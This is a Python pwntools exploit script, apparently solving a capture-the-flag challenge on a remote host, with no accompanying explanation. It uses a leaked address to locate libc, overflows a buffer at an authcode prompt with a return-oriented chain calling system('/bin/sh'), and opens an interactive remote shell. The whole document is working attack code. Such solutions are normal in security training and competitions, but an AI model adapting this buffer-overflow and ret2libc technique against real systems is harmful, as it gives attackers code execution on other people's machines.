#!/usr/bin/env python3

from pwn import *

exe = ELF("./chall_patched")
libc = ELF("./libc-2.27.so")
ld = ELF("./ld-2.27.so")

context.binary = exe

#p = process()
p = remote('chall.ehax.tech', 4269)

p.recvuntil(b'0x7f')
libc.address = int((b'0x7f'+ p.recv(10)),16)  - 0x1255e0
pop_rdi = 0x000000000002164f+libc.address
payload = b'a'*0xa8 + p64(pop_rdi) 
payload += p64(next(libc.search(b'/bin/sh\x00')))
payload += p64(pop_rdi+1) + p64(libc.sym.system)
input()
p.sendlineafter(b'Enter authcode: ',payload)
p.interactive()
